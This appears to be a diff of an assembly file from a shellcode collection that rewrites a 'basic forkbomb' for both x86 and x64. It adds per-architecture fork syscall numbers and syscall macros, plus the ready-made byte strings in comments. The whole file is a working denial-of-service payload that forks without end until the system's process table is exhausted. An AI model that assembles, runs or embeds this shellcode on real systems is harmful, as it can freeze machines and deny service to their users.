@@ -1,21 +1,24 @@
 # /* Basic forkbomb (both x86 and x64 compatible) - Length: 9 bytes */
-# char shellcode[] = "\x6a\x02\x5b\x53\x58\xcd\x80\xeb\xfa";
-
+# char shellcode_32[] = "\x6a\x02\x58\xcd\x80\xeb\xf9"
+# char shellcode_64[] = "\x6a\x39\x58\x0f\x05\xeb\xf9"
 .if ARCH == 64
-	.set Ebx, %rbx
+	.set __NR_fork, 57
 	.set Eax, %rax
+	.macro _syscall
+		syscall
+	.endm
 .else
-	.set Ebx, %ebx
+	.set __NR_fork, 2
 	.set Eax, %eax
+	.macro _syscall
+		int $0x80
+	.endm
 .endif
 
 .text
 .globl _start
 _start:
-	push   $0x2
-	pop    Ebx
-loop:
-	push   Ebx
+	push   $__NR_fork
 	pop    Eax
-	int    $0x80
-	jmp    loop
+	_syscall
+	jmp    _start
